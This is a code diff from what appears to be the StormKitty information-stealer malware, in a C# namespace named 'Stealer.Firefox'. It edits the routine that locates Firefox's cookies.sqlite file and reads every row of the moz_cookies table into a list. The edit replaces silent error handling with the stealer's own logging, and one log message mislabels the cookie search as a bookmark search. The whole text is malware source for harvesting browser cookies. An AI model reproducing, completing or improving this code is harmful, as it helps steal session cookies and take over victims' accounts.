@@ -16,7 +16,8 @@ namespace Stealer.Firefox
                     foreach (string sDir in Directory.GetDirectories(dir))
                         if (File.Exists(sDir + "\\cookies.sqlite"))
                             return sDir + "\\cookies.sqlite";
-            } catch { }
+            }
+            catch (Exception ex) { StormKitty.Logging.Log("Firefox >> Failed to find bookmarks\n" + ex); }
             return null;
         }
 
@@ -30,8 +31,7 @@ namespace Stealer.Firefox
 
                 // Read data from table
                 SQLite sSQLite = SqlReader.ReadTable(sCookiePath, "moz_cookies");
-                if (sSQLite == null)
-                    return lcCookies;
+                if (sSQLite == null) return lcCookies;
 
                 for (int i = 0; i < sSQLite.GetRowCount(); i++)
                 {
@@ -48,10 +48,9 @@ namespace Stealer.Firefox
                     lcCookies.Add(cCookie);
                 }
 
-                return lcCookies;
             }
-            catch (Exception ex) { Console.WriteLine(ex); }
-            return new List<Cookie>();
+            catch (Exception ex) { StormKitty.Logging.Log("Firefox >> cookies collection failed\n" + ex); }
+            return lcCookies;
         }
 
     }
